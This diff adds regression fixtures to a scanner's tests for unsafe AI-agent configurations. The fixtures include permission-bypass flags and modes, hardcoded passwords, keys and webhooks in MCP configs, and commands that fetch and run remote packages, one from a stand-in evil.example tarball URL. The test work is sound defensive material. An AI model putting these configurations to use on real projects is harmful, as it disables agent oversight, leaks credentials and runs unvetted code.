@@ -275,6 +275,74 @@ REVIEW_CASES: dict[str, tuple[dict[str, str], list[str]]] = {
     "r8-bearer-in-headers": ({".mcp.json": json.dumps({"mcpServers": {"notion": {
         "command": "node", "args": ["s.js"], "env": {"OPENAPI_MCP_HEADERS": json.dumps({"Authorization": BEARER})}}}})},
         ["AP05"]),
+    # Review 9. 1: a Codex config whose dotted key took tomllib minutes reported clean.
+    "r9-toml-dotted-key": ({".codex/config.toml": ".".join(["a"] * 65) + " = 1\n"}, ["incomplete"]),
+    # 4: a string holding `/*` opened a phantom block comment.
+    "r9-jenkinsfile-triple-quote": ({"Jenkinsfile": f"sh '''\n  rm -rf build/*\n  claude {FLAG} -p fix\n'''\n"
+                                                    "junit '**/x.xml'\n/* x */\n"}, ["AP02"]),
+    "r9-kotlin-text-block": ({"Main.kt": f'val s = """\n  cp src/* out\n"""\nProcessBuilder("claude", "{FLAG}")\n/* x */\n'},
+                             ["AP01"]),
+    "r9-template-nesting": ({"a.ts": f'const s = `${{a ? `x/*` : "y"}}`;\nspawn("claude", ["{FLAG}"]);\n/* x */\n'},
+                            ["AP01"]),
+    "r9-rust-raw-string": ({"a.rs": f'let s = r#"a " /* b"#;\nCommand::new("claude").arg("{FLAG}");\n/* x */\n'},
+                           ["AP01"]),
+    # 5: agent CLI calls split over lines, piped, and the anomalyco opencode action.
+    "r9-ap03-continued": ({".github/workflows/w.yml": wf('      - run: |\n          claude \\\n            --model opus \\\n'
+                                                         '            -p "$PROMPT"\n')}, ["AP03"]),
+    "r9-ap03-folded": ({".github/workflows/w.yml": wf('      - run: >\n          claude --model opus\n'
+                                                      '          -p "review"\n')}, ["AP03"]),
+    "r9-ap03-piped-bypass": ({".github/workflows/w.yml": wf(f"      - run: cat prompt.txt | claude {FLAG}\n")},
+                             ["AP03", "AP02"]),
+    "r9-ap03-anomalyco": ({".github/workflows/w.yml": wf("      - uses: anomalyco/opencode/github@latest\n")}, ["AP03"]),
+    # 6, 12: credentials the secret rules missed.
+    "r9-password-charset": ({".mcp.json": server(command="node", env={"DB_PASSWORD": "Sup3rS3cretP@ssw0rd!"})}, ["AP05"]),
+    "r9-mysql-pass": ({".mcp.json": server(command="node", env={"MYSQL_PASS": "Zp4rT9qLm2Xv8Ws1"})}, ["AP05"]),
+    "r9-pwd": ({".mcp.json": server(command="node", env={"APP_PWD": "Zp4rT9qLm2Xv8Ws1"})}, ["AP05"]),
+    "r9-password-no-digit": ({".mcp.json": server(command="node", env={"NEO4J_PASSWORD": "correct-horse-battery"})},
+                             ["AP05"]),
+    "r9-password-short": ({".mcp.json": server(command="node", env={"PGPASSWORD": "hunter2hunter2"})}, ["AP05"]),
+    "r9-pem": ({".mcp.json": server(command="node", env={"K": "-----BEGIN PRIVATE KEY-----\n" + "MIIEvQIBADAN" * 6})},
+               ["AP05"]),
+    "r9-service-account": ({".mcp.json": server(command="node", env={"GOOGLE_CREDENTIALS": json.dumps(
+        {"type": "service_account", "private_key": "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC" * 2})})}, ["AP05"]),
+    "r9-zapier": ({".mcp.json": server(url="https://mcp.zapier.com/api/mcp/s/sk-ak-" + "Ab1Cd2Ef3Gh4Ij5Kl6Mn7Op8/mcp")},
+                  ["AP05"]),
+    "r9-slack-webhook": ({".mcp.json": server(command="node", env={
+        "HOOK": "https://hooks.slack.com/services/" + "T0ABCDEF1/B0ABCDEF2/aBcD1234eFgH5678iJkL9012"})}, ["AP05"]),
+    # 8: remote and hidden unpinned packages.
+    "r9-npx-github-url": ({".mcp.json": server(command="npx", args=["-y", "https://github.com/someone/some-mcp"])},
+                          ["AP04"]),
+    "r9-npx-tarball-url": ({".mcp.json": server(command="npx", args=["-y", "https://evil.example/pkg/-/pkg-latest.tgz"])},
+                           ["AP04"]),
+    "r9-uvx-from-branch-zip": ({".mcp.json": server(command="uvx", args=[
+        "--from", "https://github.com/someone/tool/archive/refs/heads/main.zip", "tool"])}, ["AP04"]),
+    "r9-bash-login-c": ({".mcp.json": server(command="bash", args=["-l", "-c", "npx -y some-mcp"])}, ["AP04"]),
+    "r9-sudo-npx": ({".mcp.json": server(command="sudo", args=["npx", "-y", "some-mcp"])}, ["AP04"]),
+    "r9-deno-npm": ({".mcp.json": server(command="deno", args=["run", "-A", "npm:some-mcp-server"])}, ["AP04"]),
+    # 9: Crush and Amp MCP config.
+    "r9-crush": ({"crush.json": json.dumps({"mcp": {"x": {"type": "stdio", "command": "npx", "args": ["-y", "evil"]}}})},
+                 ["AP04"]),
+    "r9-amp": ({".amp/settings.json": json.dumps({"amp.mcpServers": {"x": {"command": "npx", "args": ["-y", "evil"]}}})},
+               ["AP04"]),
+    # 10: bypass mode nested, inside a JSON string, or as the VS Code extension's setting.
+    "r9-nested-default-mode": ({"agent.json": json.dumps({"profiles": {"ci": {"permissions": {
+        "defaultMode": "bypassPermissions"}}}})}, ["AP01"]),
+    "r9-devcontainer-default-mode": ({".devcontainer/devcontainer.json": json.dumps({
+        "postCreateCommand": "echo '{\"permissions\":{\"defaultMode\":\"bypassPermissions\"}}' > ~/.claude/settings.json"})},
+        ["AP01"]),
+    "r9-initial-permission-mode": ({".vscode/settings.json": json.dumps(
+        {"claudeCode.initialPermissionMode": "bypassPermissions"})}, ["AP01"]),
+    # 11: shell start-up files.
+    "r9-zshrc": ({".zshrc": f"alias c='claude {FLAG}'\n"}, ["AP01"]),
+    # 15: `;` after a space in .ini is not a comment.
+    "r9-ini-semicolon": ({"tox.ini": f"[testenv]\ncommands = sh -c cd repo ; claude {FLAG} -p x\n"}, ["AP01"]),
+    # 16: generic deny words hid passed flags.
+    "r9-guard-cmd": ({"agent.py": f'guard_cmd = ["claude", "{FLAG}"]\n'}, ["AP01"]),
+    "r9-yaml-blocks": ({"agent.yml": f"blocks:\n  - claude {FLAG} -p x\n"}, ["AP01"]),
+    # 17: gated flags on another line than the CLI.
+    "r9-black-list-yolo": ({"agent.py": 'cmd = [\n    "gemini",\n    "--yolo",\n]\n'}, ["AP01"]),
+    "r9-codex-action-args": ({".github/workflows/w.yml": "jobs:\n  a:\n    steps:\n      - uses: openai/codex-action@v1\n"
+                              "        with:\n          codex-args: '[\"--yolo\"]'\n"}, ["AP02"]),
     # 13: a truncated wsl command raised and lost every server in the file.
     "r8-truncated-wsl": ({".mcp.json": json.dumps({"mcpServers": {
         "w": {"command": "wsl", "args": ["-d"]}, "s": {"command": "npx", "args": ["-y", "evil-mcp"]}}})}, ["AP04"]),
@@ -286,7 +354,8 @@ def test_round8_review_cases_are_detected(tmp_path, name):
     files, expected = REVIEW_CASES[name]
     for rel, text in files.items():
         write(tmp_path, rel, text)
-    missing = set(expected) - scan_ids(tmp_path)
+    r = result(tmp_path)
+    missing = set(expected) - {f.rule for f in r.findings} - ({"incomplete"} if r.incomplete else set())
     assert not missing, f"{name}: does not report {sorted(missing)}"
 
 
